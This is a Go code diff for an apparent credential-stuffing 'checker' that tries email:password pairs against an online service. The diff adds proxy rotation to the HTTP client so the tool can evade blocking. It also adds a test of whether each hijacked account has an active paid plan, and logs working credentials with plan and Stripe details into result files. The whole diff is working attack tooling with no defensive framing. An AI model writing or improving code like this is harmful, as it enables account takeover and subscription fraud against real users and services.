@@ -72,15 +72,20 @@ func NewChecker(cfg *Config) (*Checker, error) {
 	}, nil
 }
 
-func (c *Checker) freshClient() (*http.Client, error) {
+func (c *Checker) freshClient(proxyURL *url.URL) (*http.Client, error) {
 	jar, err := cookiejar.New(nil)
 	if err != nil {
 		return nil, err
 	}
 	timeout := time.Duration(c.cfg.Settings.TimeoutSeconds) * time.Second
+	transport := &http.Transport{}
+	if proxyURL != nil {
+		transport.Proxy = http.ProxyURL(proxyURL)
+	}
 	return &http.Client{
-		Timeout: timeout,
-		Jar:     jar,
+		Timeout:   timeout,
+		Jar:       jar,
+		Transport: transport,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			if len(via) >= 8 {
 				return fmt.Errorf("too many redirects")
@@ -90,10 +95,10 @@ func (c *Checker) freshClient() (*http.Client, error) {
 	}, nil
 }
 
-func (c *Checker) Check(email, password string) CheckResult {
+func (c *Checker) Check(email, password string, proxyURL *url.URL) CheckResult {
 	result := CheckResult{Email: email, Password: password}
 
-	client, err := c.freshClient()
+	client, err := c.freshClient(proxyURL)
 	if err != nil {
 		result.Status = StatusError
 		result.Reason = err.Error()
@@ -265,6 +270,12 @@ func (c *Checker) Check(email, password string) CheckResult {
 	}
 
 	result.PlanLabel = classifyPlan(c.cfg, result)
+	if ok, reason := c.accountIsUsablePaid(client, accountBody, result.PlanLabel); !ok {
+		result.Status = StatusPlanInactive
+		result.Reason = reason
+		return result
+	}
+
 	result.Status = StatusHit
 	return result
 }
@@ -571,6 +582,13 @@ func writeResultFiles(cfg *Config, r CheckResult, resultsDir string) error {
 				r.PlanName, r.PlanID, r.StripePlanID, r.PlanLabel)
 		}
 		return appendLine(filepath.Join(resultsDir, "facebook_verify.txt"), line)
+	case StatusPlanInactive:
+		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
+		if r.PlanName != "" {
+			line += fmt.Sprintf(" | Plan=%s | PlanID=%s | Stripe=%s | Label=%s",
+				r.PlanName, r.PlanID, r.StripePlanID, r.PlanLabel)
+		}
+		return appendLine(filepath.Join(resultsDir, "inactive_plan.txt"), line)
 	}
 	return nil
 }
